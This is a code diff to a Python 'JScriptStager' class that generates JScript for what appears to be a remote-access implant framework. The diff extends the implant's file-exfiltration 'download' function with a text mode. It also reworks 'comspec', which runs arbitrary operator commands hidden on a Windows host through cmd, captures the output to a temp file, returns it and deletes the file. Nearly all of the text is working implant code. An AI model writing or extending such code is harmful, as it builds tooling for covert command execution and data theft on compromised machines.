@@ -128,13 +128,22 @@ class JScriptStager(Stager):
             '''stream.Close();'''
             '''return 'Successfully uploaded file.';'''
         '''}}''').format(self.variables['file-system-object'][0]))
-        self.functions['download'] = util.Function('download','Download a file to the remote system (e.g., download "remote_path")', 'File System Options', None,
-        ('''function download(path) {{'''
+        self.functions['download'] = util.Function('download','Download a file to the remote system (e.g., download "remote_path" "return_format")', 'File System Options', None,
+        ('''function download(path, format) {{'''
             '''if ({0}.FileExists(path) == false){{'''
                 '''return 'File does not exist.';'''
             '''}}'''
             '''var stream = new ActiveXObject("ADODB.Stream");'''
             '''stream.Open();'''
+            ''' if(format == 'string'){{ '''
+                '''stream.Charset = 'utf-8'; '''
+                '''stream.Type = 2;'''
+                '''stream.LoadFromFile(path);'''
+                '''stream.Position = 0;'''
+                '''data = stream.ReadText();'''
+                '''stream.Close();'''
+                '''return data'''
+            ''' }} '''
             '''stream.Type = 1;'''
             '''stream.LoadFromFile(path);'''
             '''stream.Position = 0;'''
@@ -212,7 +221,7 @@ class JScriptStager(Stager):
         '''}}''').format(self.variables['file-system-object'][0]))
 
         # Command Execution Options
-        self.functions['comspec'] = util.Function('comspec', 'Executes commands with the command sepecifier', 'Command Execution Options', [self.functions['delfile'], self.functions['download']],
+        self.functions['comspec'] = util.Function('comspec', 'Executes commands with the command sepecifier (e.g., comspec "command")', 'Command Execution Options', [self.functions['delfile'], self.functions['download']],
         (''' function comspec(command) {{ '''
            ''' stdout_path = {1} + '\\\{3}.txt'; '''
            ''' if ({2}.FileExists(stdout_path)) {{ '''
@@ -221,11 +230,12 @@ class JScriptStager(Stager):
            ''' command = {4} + ' /q /c ' + command + ' 1> ' + stdout_path + ' 2>&1'; '''
            ''' try {{ '''
              ''' {0}.Run(command, 0, true); '''
-             ''' results = download(stdout_path); '''
+             ''' results = 'Executed ( ' + command + ' )\\n\\n'; '''
+             ''' results = results + download(stdout_path, 'string'); '''
              ''' delfile(stdout_path); '''
-             ''' return results; '''
+             ''' return results;  '''
            ''' }} catch (e) {{ '''
-             ''' return e.message; '''
+             ''' return 'Failed to run ' + command + ': ' + e.message; '''
            ''' }} '''
         '''}}''').format(self.variables['wscript.shell'][0], self.variables['tmp'][1], self.variables['file-system-object'][0], util.generate_str(), self.variables['compsec'][1]))
 
